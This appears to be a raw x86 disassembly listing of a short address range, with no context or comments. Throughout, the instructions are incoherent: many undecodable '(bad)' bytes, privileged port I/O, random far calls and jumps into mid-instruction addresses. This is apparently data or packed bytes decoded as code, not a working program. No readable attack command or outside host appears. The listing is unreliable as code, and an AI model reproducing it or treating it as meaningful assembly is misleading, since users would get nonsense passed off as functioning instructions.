  41f5a2:	push   0x6b
  41f5a4:	into   
  41f5a5:	inc    ebx
  41f5a6:	popf   
  41f5a7:	cmp    DWORD PTR [ecx],edx
  41f5a9:	sbb    DWORD PTR [esi],0x50fed153
  41f5af:	xchg   ecx,eax
  41f5b0:	lahf   
  41f5b1:	(bad)  
  41f5b2:	xor    DWORD PTR [ecx],edx
  41f5b4:	sub    eax,0xffffffb2
  41f5b7:	test   al,0xb0
  41f5b9:	inc    esp
  41f5ba:	push   ebx
  41f5bb:	jnp    0x41f5a1
  41f5bd:	in     eax,dx
  41f5be:	ins    BYTE PTR es:[edi],dx
  41f5bf:	out    0xbd,al
  41f5c1:	jecxz  0x41f552
  41f5c3:	scas   al,BYTE PTR es:[edi]
  41f5c4:	mov    edi,0xad06d80b
  41f5c9:	mov    WORD PTR [eax+edi*4-0x2a4ef579],?
  41f5d0:	fldenv [ebx]
  41f5d2:	xor    dh,dh
  41f5d4:	(bad)  
  41f5d5:	imul   esp,DWORD PTR [edi],0xf4c1a1c3
  41f5db:	mov    ch,0xae
  41f5dd:	and    cl,BYTE PTR [ebx]
  41f5df:	inc    eax
  41f5e0:	dec    esi
  41f5e1:	and    BYTE PTR [edx],dh
  41f5e3:	inc    edx
  41f5e4:	scas   eax,DWORD PTR es:[edi]
  41f5e5:	shl    DWORD PTR [esi+0x386c1690],1
  41f5eb:	mov    ebp,0x15714883
  41f5f0:	loop   0x41f5ea
  41f5f2:	enter  0xf412,0x21
  41f5f6:	jno    0x41f62c
  41f5f8:	inc    esi
  41f5f9:	xchg   esi,eax
  41f5fa:	mov    al,0x6b
  41f5fc:	lahf   
  41f5fd:	(bad)  
  41f5fe:	sub    al,0x55
  41f600:	add    al,0xb0
  41f602:	inc    esp
  41f603:	mov    ebp,0xc57712e5
  41f608:	mov    ch,0x97
  41f60a:	mov    ah,0x21
  41f60c:	cmp    eax,DWORD PTR [edx-0x55166f76]
  41f612:	and    edx,edx
  41f614:	push   esp
  41f615:	fst    QWORD PTR [ebx+0x3bd3c20a]
  41f61b:	adc    al,ah
  41f61d:	mov    al,ah
  41f61f:	ret    
  41f620:	std    
  41f621:	mov    ch,0x18
  41f623:	cmp    ebx,DWORD PTR [eax-0x706a8aa9]
  41f629:	jl     0x41f5c6
  41f62b:	popf   
  41f62c:	mov    bh,0x33
  41f62e:	(bad)  
  41f62f:	rcl    BYTE PTR [eax+0x2],0xac
  41f633:	mov    al,0xd5
  41f635:	pushf  
  41f636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f637:	jo     0x41f616
  41f639:	xchg   edx,eax
  41f63a:	dec    edx
  41f63b:	into   
  41f63c:	sub    BYTE PTR [esi+esi*4+0x46],bh
  41f640:	leave  
  41f641:	xor    al,0xee
  41f643:	inc    edi
  41f644:	fimul  DWORD PTR [edx+0x35]
  41f647:	das    
  41f648:	or     al,0x41
  41f64a:	test   BYTE PTR [esi+0x37de8ed2],ch
  41f650:	adc    eax,0xd32803da
  41f655:	xchg   BYTE PTR [edi-0xba4b1],dh
  41f65b:	cmp    dl,BYTE PTR [eax]
  41f65d:	je     0x41f61c
  41f65f:	xor    edi,DWORD PTR ds:0xa7529e8b
  41f665:	(bad)  
  41f666:	ret    
  41f667:	hlt    
  41f668:	mov    esp,0x7fc39b66
  41f66d:	or     eax,0xac5d92de
  41f672:	test   BYTE PTR [ebx],ch
  41f674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f675:	es in  al,dx
  41f677:	xchg   edi,eax
  41f678:	mov    ebp,edx
  41f67a:	ror    dl,1
  41f67c:	sub    dh,dh
  41f67e:	dec    esi
  41f67f:	push   0x45c93369
  41f684:	lds    edi,FWORD PTR [ecx]
  41f686:	mov    ah,0xd0
  41f688:	jno    0x41f668
  41f68a:	data16 int3 
  41f68c:	inc    ebx
  41f68d:	idiv   ebx
  41f68f:	enter  0xe360,0xf9
  41f693:	and    eax,0x6e83e54
  41f698:	add    dl,BYTE PTR [edx+0x0]
  41f69b:	sub    edi,DWORD PTR [ebx]
  41f69d:	pop    edx
  41f69e:	inc    edi
  41f69f:	mov    ebp,0xb4eb1904
  41f6a4:	inc    ebp
  41f6a5:	xchg   esi,eax
  41f6a6:	xchg   bx,ax
  41f6a8:	jmp    0x41f6ba
  41f6aa:	retf   
  41f6ab:	sbb    al,0x4
  41f6ad:	jmp    0x2f86:0xeced16ed
  41f6b4:	pop    ecx
  41f6b5:	cdq    
  41f6b6:	call   0x79501b6c
  41f6bb:	ja     0x41f6c8
  41f6bd:	pop    edx
  41f6be:	xor    eax,0x3ecebcae
  41f6c3:	cs iret 
  41f6c5:	(bad)  
  41f6c6:	xor    DWORD PTR [edx-0x5ad9f1d9],ebp
  41f6cc:	fisttp WORD PTR [ecx+eiz*4-0x63]
  41f6d0:	xor    cl,BYTE PTR [edx]
  41f6d2:	xchg   ch,ch
  41f6d4:	in     al,dx
  41f6d5:	outs   dx,BYTE PTR ds:[esi]
  41f6d6:	sub    DWORD PTR [edx+0x3b],eax
  41f6d9:	xor    esp,DWORD PTR [esi]
  41f6db:	sbb    DWORD PTR [edi+0x7a4aa37e],ebp
  41f6e1:	rcr    BYTE PTR [ebx],1
  41f6e3:	jae    0x41f6f3
  41f6e5:	or     dh,BYTE PTR [esi+0x16]
  41f6e8:	push   ebp
  41f6e9:	je     0x41f720
  41f6eb:	cmp    al,0x8f
  41f6ed:	stc    
  41f6ee:	add    BYTE PTR [ebx],ch
  41f6f0:	jge    0x41f75a
  41f6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6f3:	imul   ebx,DWORD PTR [edi+0x1d],0xa9ed9853
  41f6fa:	xor    al,0xe1
  41f6fc:	xor    DWORD PTR [ecx*8+0x7ea9a910],esp
  41f703:	imul   ecx,DWORD PTR ds:0x18fa4025,0xad7fe74e
  41f70d:	ret    0x23c7
  41f710:	jbe    0x41f6a2
  41f712:	nop
  41f713:	sbb    bl,BYTE PTR [edx]
  41f715:	adc    BYTE PTR [esi+0x3e918727],0x36
  41f71c:	or     DWORD PTR [ebx+0x8],edx
  41f71f:	and    BYTE PTR [esi-0x1],0x23
  41f723:	adc    al,0x62
  41f725:	test   al,0x21
  41f727:	dec    ecx
  41f728:	mov    ds:0x8870c42d,al
  41f72d:	adc    esp,esp
  41f72f:	jns    0x41f777
  41f731:	cmp    al,0xee
  41f733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f734:	xchg   esp,eax
  41f735:	cli    
  41f736:	push   ecx
  41f737:	in     eax,dx
  41f738:	int    0x9
  41f73a:	xchg   esp,eax
  41f73b:	inc    edi
  41f73c:	test   BYTE PTR [edx+eax*2+0x7f6cc3b5],bh
  41f743:	loope  0x41f71f
  41f745:	cmp    DWORD PTR [ebx+0x2243a640],eax
  41f74b:	int3   
  41f74c:	and    eax,0x8428142e
  41f751:	mov    ch,0x82
  41f753:	cmp    al,0xb8
  41f755:	pop    esp
  41f756:	call   0x910e:0x5ab20fc0
  41f75d:	mov    esp,0xa08c372f
  41f762:	pushf  
  41f763:	add    eax,0xc2221322
  41f768:	not    DWORD PTR [ecx-0x9]
  41f76b:	pop    edi
  41f76c:	enter  0x7f23,0x9f
  41f770:	leave  
  41f771:	mov    al,0xc8
  41f773:	outs   dx,BYTE PTR ds:[esi]
  41f774:	push   cs
  41f775:	mov    al,ds:0x24984faa
  41f77a:	popf   
  41f77b:	push   0xfffffff8
  41f77d:	scas   eax,DWORD PTR es:[edi]
  41f77e:	xor    DWORD PTR [esi],0xef095faf
  41f784:	and    edx,DWORD PTR [edx]
  41f786:	adc    edx,DWORD PTR [ecx+0x40c33ead]
  41f78c:	jl     0x41f7d6
  41f78e:	outs   dx,DWORD PTR ds:[esi]
  41f78f:	scas   eax,DWORD PTR es:[edi]
  41f790:	cmc    
  41f791:	hlt    
  41f792:	rsqrtps xmm5,XMMWORD PTR [eax+eax*4+0x5d]
  41f797:	sbb    eax,0x2e4a96d
  41f79c:	adc    al,0x1a
  41f79e:	push   0xfe642aa
  41f7a3:	xor    BYTE PTR [ecx+0x1b],0xef
  41f7a7:	pusha  
  41f7a8:	mov    edi,0xeeb0fc1
  41f7ad:	xor    bl,BYTE PTR [eax]
  41f7af:	popf   
  41f7b0:	pop    es
  41f7b1:	mov    BYTE PTR [ecx+0x429bc1f1],0xd6
  41f7b8:	mov    edx,0x57347222
  41f7bd:	xor    eax,0xfa7241eb
  41f7c2:	(bad)  
  41f7c3:	stos   DWORD PTR es:[edi],eax
  41f7c4:	gs pop esi
  41f7c6:	gs jecxz 0x41f752
  41f7c9:	push   edx
  41f7ca:	adc    dl,BYTE PTR [ebp+0x29]
  41f7cd:	shr    DWORD PTR [esi-0xe],1
  41f7d0:	sti    
  41f7d1:	enter  0x63b6,0x74
  41f7d5:	push   0xfffffffe
  41f7d7:	xchg   DWORD PTR [esi+ecx*2],eax
  41f7da:	jnp    0x41f82d
  41f7dc:	ins    DWORD PTR es:[edi],dx
  41f7dd:	or     DWORD PTR [eax+0x2ceed8b0],esi
  41f7e3:	add    al,0xe5
  41f7e5:	out    0x7e,al
  41f7e7:	pop    ebp
  41f7e8:	pop    ds
  41f7e9:	mov    es,WORD PTR [esi-0xa630072]
  41f7ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7f0:	sbb    bh,bl
  41f7f2:	(bad)  
  41f7f3:	outs   dx,BYTE PTR ds:[esi]
  41f7f4:	js     0x41f7b2
  41f7f6:	jnp    0x41f779
  41f7f8:	inc    esi
  41f7f9:	(bad)  
  41f7fa:	adc    esp,ebp
  41f7fc:	cld    
  41f7fd:	fwait
  41f7fe:	xchg   edx,eax
  41f7ff:	fwait
  41f800:	dec    ebp
  41f801:	fild   WORD PTR [ebx+0x4c]
  41f804:	imul   ebp,esi,0xffffffad
  41f807:	fist   DWORD PTR [ecx-0x6024bcfd]
  41f80d:	sbb    DWORD PTR [ebp-0xd8b4daa],ecx
  41f813:	lods   al,BYTE PTR ds:[esi]
  41f814:	les    ebp,FWORD PTR [ecx-0x2810486e]
  41f81a:	jnp    0x41f87c
  41f81c:	in     al,dx
  41f81d:	int3   
  41f81e:	(bad)  
  41f81f:	or     al,0x17
  41f821:	cmp    al,0x7b
  41f823:	jp     0x41f834
  41f825:	ds cs push edx
  41f828:	pop    ds
  41f829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f82a:	js     0x41f82e
  41f82c:	out    0x41,eax
  41f82e:	test   BYTE PTR [edx+ecx*4+0x13],ch
  41f832:	xor    eax,0x47614dd9
  41f837:	enter  0x3a82,0x5b
  41f83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f83c:	push   edi
  41f83d:	pop    esp
  41f83e:	push   ecx
  41f83f:	inc    ebp
  41f840:	jns    0x41f7c7
  41f842:	dec    eax
  41f843:	stos   DWORD PTR es:[edi],eax
  41f844:	ds mov edx,0xc8d9ee49
  41f84a:	cdq    
  41f84b:	sar    ebp,0x96
  41f84e:	std    
  41f84f:	inc    ecx
  41f850:	js     0x41f80f
  41f852:	mov    BYTE PTR [ebp-0x7beb2398],dl
  41f858:	loopne 0x41f81f
  41f85a:	sbb    DWORD PTR [eax+ebp*1],0xffffffcd
  41f85e:	stos   BYTE PTR es:[edi],al
  41f85f:	dec    ebp
  41f860:	inc    eax
  41f861:	add    al,0x9f
  41f863:	aaa    
  41f864:	xchg   ebp,eax
  41f865:	test   DWORD PTR [ecx+0x61],esi
  41f868:	push   ss
  41f869:	xchg   BYTE PTR [edx-0x3dba8949],dl
  41f86f:	pop    eax
  41f870:	adc    BYTE PTR [ecx+0x6c],ch
  41f873:	push   cs
  41f874:	add    al,0x3b
  41f876:	mov    ebx,0x94c92f9c
  41f87b:	mov    edi,0xa3c3bab6
  41f880:	imul   edx,DWORD PTR [esi+esi*8+0x20],0xfc6ecee5
  41f888:	pop    edx
  41f889:	or     eax,0x747cec96
  41f88e:	push   edi
  41f88f:	mov    DWORD PTR [edi-0x27a9027b],ebx
  41f895:	(bad)  
  41f896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f897:	popf   
  41f898:	mov    cl,0xcc
  41f89a:	addr16 mov dh,0x19
  41f89d:	xor    DWORD PTR [ecx],edi
  41f89f:	mov    DWORD PTR [ecx+0x63],edi
  41f8a2:	addr16 or eax,0xa0daed7d
  41f8a8:	sub    DWORD PTR [ecx],ebx
  41f8aa:	rcl    esp,cl
  41f8ac:	inc    ebx
  41f8ad:	ror    DWORD PTR [ebx-0xb5a1a4a],1
  41f8b3:	xlat   BYTE PTR ds:[ebx]
  41f8b4:	sar    BYTE PTR [esi],1
  41f8b6:	(bad)  
  41f8b7:	in     al,0xb4
  41f8b9:	sbb    BYTE PTR [ecx+0x6fb30637],bl
  41f8bf:	or     DWORD PTR [edi],ebx
  41f8c1:	or     eax,0xee7217be
  41f8c6:	or     DWORD PTR [eax-0x10978a63],eax
  41f8cc:	cmp    edx,edi
  41f8ce:	adc    BYTE PTR [edi],0x7f
  41f8d1:	int3   
  41f8d2:	jle    0x41f862
  41f8d4:	xor    al,0x4a
  41f8d6:	iret   
  41f8d7:	xor    al,BYTE PTR [esi-0x664e27bb]
  41f8dd:	jns    0x41f8b5
  41f8df:	loope  0x41f864
  41f8e1:	aad    0xd1
  41f8e3:	push   cs
  41f8e4:	cmc    
  41f8e5:	push   ds
  41f8e6:	cdq    
  41f8e7:	(bad)  
  41f8e8:	fidiv  WORD PTR [ebp-0x2]
  41f8eb:	and    DWORD PTR [eax-0x2f],0x23b9fca3
  41f8f2:	adc    DWORD PTR [edi],ebp
  41f8f4:	outs   dx,BYTE PTR ds:[esi]
  41f8f5:	or     al,BYTE PTR [ebx]
  41f8f7:	into   
  41f8f8:	rdpmc  
  41f8fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8fb:	push   cs
  41f8fc:	ret    0xd1ce
  41f8ff:	out    0xbc,eax
  41f901:	adc    eax,DWORD PTR [edi-0x116c0419]
  41f907:	mov    edx,0x2341c8b6
  41f90c:	push   esp
  41f90d:	add    BYTE PTR [esi+ecx*2+0x51],ch
  41f911:	pop    fs
  41f913:	push   cs
  41f914:	add    eax,0xcc69212a
  41f919:	mov    al,0x60
  41f91b:	cdq    
  41f91c:	xor    esi,esi
  41f91e:	or     esp,ebp
  41f920:	sahf   
  41f921:	push   dx
  41f923:	lea    eax,[ebp+ebp*2+0x14]
  41f927:	jecxz  0x41f94c
  41f929:	push   ds
  41f92a:	cmp    ch,dl
  41f92c:	loope  0x41f998
  41f92e:	sbb    eax,DWORD PTR [edi+0x6027c4d2]
  41f934:	hlt    
  41f935:	test   DWORD PTR [eax-0xfd93c12],0x75a271b
  41f93f:	retf   0x12ac
  41f942:	sub    dh,dl
  41f944:	fcomp  QWORD PTR [ebp+0x35]
  41f947:	xchg   edi,eax
  41f948:	call   0x2409:0xf0bd23d
  41f94f:	sti    
  41f950:	sbb    esp,DWORD PTR [edx]
  41f952:	sub    eax,0xfbd43891
  41f957:	cld    
  41f958:	data16 sahf 
  41f95a:	adc    BYTE PTR [edi+0x1a],0xe0
  41f95e:	push   0xffffffe2
  41f960:	adc    esi,DWORD PTR [esp+eiz*8]
  41f963:	int    0x79
  41f965:	inc    esp
  41f966:	popa   
  41f967:	and    cl,BYTE PTR [edi+0x3b01f333]
  41f96d:	xchg   eax,eax
  41f96f:	jecxz  0x41f915
  41f971:	(bad)  
  41f972:	fdivr  QWORD PTR [eax+eax*8-0x36fcc664]
  41f979:	jnp    0x41f9cd
  41f97b:	jp     0x41f930
  41f97d:	dec    esi
  41f97e:	mov    ebx,0xff249a32
  41f983:	scas   al,BYTE PTR es:[edi]
  41f984:	iret   
  41f985:	add    eax,0xd20b0914
  41f98a:	mov    ebx,0xfc561945
  41f98f:	fld    QWORD PTR [eax-0x4049adeb]
  41f995:	add    dl,dh
  41f997:	sti    
  41f998:	cmp    edx,DWORD PTR ds:0xc36c7710
  41f99e:	hlt    
  41f99f:	outs   dx,BYTE PTR ds:[esi]
  41f9a0:	hlt    
  41f9a1:	and    DWORD PTR [ebp-0xf],edi
  41f9a4:	mov    esp,DWORD PTR ds:0xe3e2c64e
  41f9aa:	ins    BYTE PTR es:[edi],dx
  41f9ab:	xchg   ebx,eax
  41f9ac:	dec    ebp
  41f9ad:	out    dx,eax
  41f9ae:	sbb    eax,0xaaa9b467
  41f9b3:	or     BYTE PTR [edi+0x2472268c],dh
  41f9b9:	lahf   
  41f9ba:	or     DWORD PTR [ecx+0x75],esi
  41f9bd:	das    
  41f9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9bf:	mov    DWORD PTR [ecx-0x27752c34],edi
  41f9c5:	or     eax,0x4feaa24e
  41f9ca:	rcl    BYTE PTR [esi-0x36455a87],1
  41f9d0:	cwde   
  41f9d1:	push   eax
  41f9d2:	xor    al,bh
  41f9d4:	outs   dx,DWORD PTR ds:[esi]
  41f9d5:	jno    0x41f9dc
  41f9d7:	imul   ebx,DWORD PTR [edx],0x3c
  41f9da:	push   ss
  41f9db:	dec    esi
  41f9dc:	adc    BYTE PTR [edi],dh
  41f9de:	ja     0x41f98b
  41f9e0:	inc    edx
  41f9e1:	nop
  41f9e2:	mov    al,ds:0xf61f2372
  41f9e7:	arpl   WORD PTR [edi],bp
  41f9e9:	out    0xc9,al
  41f9eb:	sbb    al,0x71
  41f9ed:	push   0x27
  41f9ef:	cmovnp ebp,esp
  41f9f2:	lock push esi
  41f9f4:	mov    esi,eax
  41f9f6:	push   ebx
  41f9f7:	aaa    
  41f9f8:	adc    BYTE PTR ds:0xe2c0f5a1,0x25
  41f9ff:	test   eax,0xbeec6473
  41fa04:	push   esp
  41fa05:	lea    edi,[ecx]
  41fa07:	out    0x3,al
  41fa09:	cmp    eax,DWORD PTR [ebx+0x7b]
  41fa0c:	push   0x28c4507c
  41fa11:	rol    DWORD PTR [ebx+esi*1-0x461a0089],0x4
  41fa19:	mov    ds:0x214f4d25,eax
  41fa1e:	fiadd  WORD PTR [edx]
  41fa20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa21:	sbb    al,0x69
  41fa23:	sbb    ah,BYTE PTR [edi]
  41fa25:	repz ja 0x41f9d2
  41fa28:	xchg   ebx,eax
  41fa29:	call   0x18b3:0xc83df26e
  41fa30:	sbb    ebp,DWORD PTR [edx]
  41fa32:	jnp    0x41fa16
  41fa34:	sti    
  41fa35:	call   edi
  41fa37:	mov    al,0x5c
  41fa39:	pop    esi
  41fa3a:	push   ebx
  41fa3b:	mov    dh,0x2d
  41fa3d:	xlat   BYTE PTR ds:[ebx]
  41fa3e:	inc    edi
  41fa3f:	in     eax,0x25
  41fa41:	pushf  
  41fa42:	inc    ebp
  41fa43:	xchg   esp,eax
  41fa44:	jmp    0x41fa4d
  41fa46:	imul   ecx,DWORD PTR [ecx+0x11],0x87606302
  41fa4d:	lods   al,BYTE PTR ds:[esi]
  41fa4e:	push   esp
  41fa4f:	mov    esi,DWORD PTR [ebx+0x46]
  41fa52:	add    eax,0xad30bc42
  41fa57:	pop    ds
  41fa58:	mov    dh,0xcd
  41fa5a:	and    ebp,0x7c
  41fa5d:	arpl   WORD PTR [ebx+0x56],si
  41fa60:	sub    ebp,ebx
  41fa62:	mov    WORD PTR [ebp-0x48],fs
  41fa65:	jo     0x41fab4
  41fa67:	repz lea esp,[ebp+0x3f]
  41fa6b:	jbe    0x41fa27
  41fa6d:	jge    0x41fae0
  41fa6f:	cwde   
  41fa70:	test   eax,0xa6b29feb
  41fa75:	push   0xffffffca
  41fa77:	popf   
  41fa78:	inc    esp
  41fa79:	out    dx,al
  41fa7a:	call   0xf20aede1
  41fa7f:	adc    BYTE PTR [esi+0x1d],al
  41fa82:	xlat   BYTE PTR ds:[ebx]
  41fa83:	rcl    BYTE PTR [esi],1
  41fa85:	push   es
  41fa86:	scas   al,BYTE PTR es:[edi]
  41fa87:	in     eax,dx
  41fa88:	ins    BYTE PTR es:[edi],dx
  41fa89:	mov    edi,0x8f747a16
  41fa8e:	dec    ecx
  41fa8f:	xchg   edi,esp
  41fa91:	cmp    al,0xe1
  41fa93:	dec    DWORD PTR [eax]
  41fa95:	loope  0x41fa2c
  41fa97:	stos   BYTE PTR es:[edi],al
  41fa98:	fbld   TBYTE PTR [ebx-0x553d5940]
  41fa9e:	xchg   edx,eax
  41fa9f:	mov    BYTE PTR ds:0x6cbbb86e,0xa7
  41faa6:	mov    ds:0x325507df,al
  41faab:	in     eax,dx
  41faac:	mov    edi,0x1f1c9254
  41fab1:	push   edi
  41fab2:	mov    eax,0xc89e9dcd
  41fab7:	aad    0xd8
  41fab9:	push   cs
  41faba:	add    BYTE PTR [esi-0x6b],ch
  41fabd:	dec    edx
  41fabf:	ins    DWORD PTR es:[edi],dx
  41fac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fac1:	ror    DWORD PTR [ebx+0x6f],0x8b
  41fac5:	push   ss
  41fac6:	jmp    0x49f89632
  41facb:	xor    al,0xbd
  41facd:	inc    edi
  41face:	inc    ebx
  41facf:	xchg   BYTE PTR [ecx-0x5bdca8d5],bl
  41fad5:	popa   
  41fad6:	call   0x3fe1:0x3f422e99
  41fadd:	lahf   
  41fade:	ds int3 
  41fae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae1:	shl    DWORD PTR ds:0x7f27d48a,1
  41fae7:	sub    BYTE PTR [edi+0x45593ad9],ch
  41faed:	dec    ecx
  41faee:	add    dh,ch
  41faf0:	in     al,0x25
  41faf2:	(bad)  
  41faf3:	int3   
  41faf4:	inc    edi
  41faf5:	mov    al,0xce
  41faf7:	sbb    eax,0x4389a105
  41fafc:	mov    esi,0x2b19c5e
  41fb01:	add    ecx,DWORD PTR [ebx-0x8]
  41fb04:	add    al,0x1d
  41fb06:	test   esi,edx
  41fb08:	cmp    cl,BYTE PTR [ebx+0x36]
  41fb0b:	mov    cl,0x19
  41fb0d:	xor    BYTE PTR ds:0xfacb9c82,0x53
  41fb14:	cdq    
  41fb15:	(bad)  
  41fb16:	pop    ecx
  41fb17:	and    cl,cl
  41fb19:	mov    eax,0x2e9fb898
  41fb1e:	sbb    DWORD PTR [ebx+0x7a],esi
  41fb21:	pop    es
  41fb22:	aas    
  41fb23:	or     bh,BYTE PTR [eax+0x49]
  41fb26:	fimul  WORD PTR [ecx-0x3a]
  41fb29:	adc    BYTE PTR [ebp+0x8bb7239],bl
  41fb2f:	adc    BYTE PTR ds:0x9f6a71ab,cl
  41fb35:	loope  0x41fb8b
  41fb37:	clc    
  41fb38:	or     DWORD PTR [bx+si-0x54f1],ebp
  41fb3d:	or     bl,BYTE PTR [ecx+0x60d6f559]
  41fb43:	(bad)
  41fb46:	pop    ds
  41fb47:	mov    ebp,0x5131cbf2
  41fb4c:	gs and ch,ah
  41fb4f:	cmp    al,0x68
  41fb51:	jecxz  0x41faf4
  41fb53:	inc    ebp
  41fb54:	cmp    ebx,DWORD PTR [ecx+0x6f]
  41fb57:	cs xchg edx,eax
  41fb59:	adc    eax,0xa91dbd13
  41fb5e:	(bad)
  41fb61:	mov    bl,0x6
  41fb63:	cld    
  41fb64:	xor    eax,0xa1de7aed
  41fb69:	mov    edx,0x3e3f9866
  41fb6e:	sub    eax,esi
  41fb70:	sbb    DWORD PTR [ebp-0x21],ecx
  41fb73:	shl    BYTE PTR [ebp-0x2ef0d1d8],0x63
  41fb7a:	and    dh,BYTE PTR [ebx-0x932cf3b]
  41fb80:	pop    esp
  41fb81:	add    eax,DWORD PTR [eax+0xa]
  41fb84:	push   edi
  41fb85:	aaa    
  41fb86:	std    
  41fb87:	gs push es
  41fb89:	loop   0x41fb13
  41fb8b:	dec    esi
  41fb8c:	sbb    ecx,esp
  41fb8e:	jecxz  0x41fbc9
  41fb90:	pop    edx
  41fb91:	jp     0x41fb9f
  41fb93:	mov    ch,0xa
  41fb95:	outs   dx,DWORD PTR ds:[esi]
  41fb96:	or     bl,BYTE PTR [esi+0x6f3768d9]
  41fb9c:	repnz in al,0x91
  41fb9f:	jmp    0x3fec74dd
  41fba4:	retf   
  41fba5:	cdq    
  41fba6:	es mov ebx,0xd58e5c4f
  41fbac:	mov    dl,0x4c
  41fbae:	add    eax,0xd49e4fd4
  41fbb3:	mov    dh,0x1f
  41fbb5:	nop
  41fbb6:	pop    edi
  41fbb7:	(bad)  
  41fbb8:	in     eax,dx
  41fbb9:	dec    edi
  41fbba:	sbb    esi,edx
  41fbbc:	jnp    0x41fbdd
  41fbbe:	fild   QWORD PTR ss:[ebp-0x2f]
  41fbc2:	add    eax,0xb2b4b7fc
  41fbc7:	inc    edi
  41fbc8:	cmp    bl,ah
  41fbca:	test   DWORD PTR [esp+eiz*2-0x15885c90],ecx
  41fbd1:	push   ss
  41fbd2:	xchg   edi,eax
  41fbd3:	add    al,0x5e
  41fbd5:	shl    ebx,1
  41fbd7:	push   0x56
  41fbd9:	or     eax,0x27639f56
  41fbde:	and    eax,0xf7406ccd
  41fbe3:	in     eax,dx
  41fbe4:	or     ebx,DWORD PTR [ebp+eax*4-0x3ce9a2fd]
  41fbeb:	loope  0x41fb72
  41fbed:	lds    ebp,FWORD PTR ds:0x3eb1c6d7
  41fbf3:	out    0xbf,eax
  41fbf5:	pop    ebx
  41fbf6:	data16 sub dh,BYTE PTR [esi+0x49900628]
  41fbfd:	outs   dx,DWORD PTR ds:[esi]
  41fbfe:	cmp    ebp,DWORD PTR ds:0xdd4403c3
  41fc04:	pop    ss
  41fc05:	mov    al,ds:0x70a30856
  41fc0a:	mov    BYTE PTR [esi+0x64df3f1e],bl
  41fc10:	or     ah,0x9b
  41fc13:	outs   dx,BYTE PTR ds:[esi]
  41fc14:	imul   edi,DWORD PTR [ebx+0x15dff090],0x6e
  41fc1b:	leave  
  41fc1c:	ins    DWORD PTR es:[edi],dx
  41fc1d:	fs (bad) 
  41fc1f:	cmp    ecx,DWORD PTR [edx+0x4e278a4]
  41fc25:	in     al,dx
  41fc26:	not    dh
  41fc28:	and    bl,BYTE PTR [esi]
  41fc2a:	cmp    bh,cl
  41fc2c:	hlt    
  41fc2d:	shr    DWORD PTR [ebp-0x1b],0xcf
  41fc31:	xchg   esp,eax
  41fc32:	mov    DWORD PTR [edi],esp
  41fc34:	cmp    al,0x62
  41fc36:	adc    BYTE PTR [ebx],cl
  41fc38:	add    bh,bh
  41fc3a:	sub    esi,DWORD PTR [eax+0x38]
  41fc3d:	loope  0x41fc2e
  41fc3f:	mov    edi,0x228c2847
  41fc44:	xor    ah,dh
  41fc46:	lea    edx,[edx+0x1f]
  41fc49:	das    
  41fc4a:	(bad)  
  41fc4b:	push   edi
  41fc4c:	stos   DWORD PTR es:[edi],eax
  41fc4d:	push   ebx
  41fc4e:	push   es
  41fc4f:	pop    eax
  41fc50:	jmp    0x41fc17
  41fc52:	in     eax,dx
  41fc53:	cdq    
  41fc54:	leave  
  41fc55:	push   edi
  41fc56:	push   ds
  41fc57:	pop    eax
  41fc58:	cld    
  41fc59:	stos   DWORD PTR es:[edi],eax
  41fc5a:	pop    es
  41fc5b:	fcomp  QWORD PTR [eax-0x1d]
  41fc5e:	cwde   
  41fc5f:	int    0xa1
  41fc61:	iret   
  41fc62:	pop    ebx
  41fc63:	pop    es
  41fc64:	fs mov al,0x33
  41fc67:	mov    ebx,0x8780026f
  41fc6c:	rcl    ah,1
  41fc6e:	test   BYTE PTR [edi+0x71],bh
  41fc71:	dec    ebp
  41fc72:	xchg   ebx,eax
  41fc73:	int    0x83
  41fc75:	mov    ebx,0x397973b8
  41fc7a:	(bad)  
  41fc7b:	mov    ebp,0xe243857
  41fc80:	inc    ecx
  41fc81:	je     0x41fcd4
  41fc83:	test   DWORD PTR [eax+0x54825e03],esp
  41fc89:	and    ah,bl
  41fc8b:	fld    QWORD PTR [ebx+0x15d56351]
  41fc91:	push   esi
  41fc92:	jge    0x41fcd3
  41fc94:	scas   eax,DWORD PTR es:[edi]
  41fc95:	push   ebx
  41fc96:	out    0x9a,al
  41fc98:	out    0xcc,eax
  41fc9a:	aas    
  41fc9b:	hlt    
  41fc9c:	iret   
  41fc9d:	pop    esi
  41fc9e:	push   ebx
  41fc9f:	sub    dl,BYTE PTR [edi+0x4f]
  41fca2:	sbb    al,0x50
  41fca4:	and    eax,0x6bb691a0
  41fca9:	pop    ebp
  41fcaa:	pop    ebx
  41fcab:	mov    edi,0xdb96184a
  41fcb0:	stos   BYTE PTR es:[edi],al
  41fcb1:	dec    ebx
  41fcb2:	and    edx,ebx
  41fcb4:	out    dx,al
  41fcb5:	inc    eax
  41fcb6:	mov    DWORD PTR ds:0x17a8d5ee,ebx
  41fcbc:	xor    DWORD PTR [ebx+0x398ee3e8],ebp
  41fcc2:	(bad)  
  41fcc3:	fst    DWORD PTR [eax]
  41fcc5:	sbb    cl,BYTE PTR [eax+0x8]
  41fcc8:	cld    
  41fcc9:	xchg   edx,eax
  41fcca:	push   ds
  41fccb:	adc    cl,al
  41fccd:	mul    BYTE PTR [bp+di-0x7fe5]
  41fcd2:	push   0x29
  41fcd4:	std    
  41fcd5:	dec    ebx
  41fcd6:	dec    eax
  41fcd7:	push   esp
  41fcd8:	call   0xf81e7ad4
  41fcdd:	les    edx,FWORD PTR ds:0x5eea65d7
  41fce3:	jp     0x41fd34
  41fce5:	push   esp
  41fce6:	pop    ebx
  41fce7:	iret   
  41fce8:	outs   dx,BYTE PTR ds:[esi]
  41fce9:	add    eax,0x5d74e7d2
  41fcee:	push   edi
  41fcef:	mov    ebx,0xefcad20a
  41fcf4:	inc    eax
  41fcf5:	mov    dl,BYTE PTR [edx+0x130f6c4a]
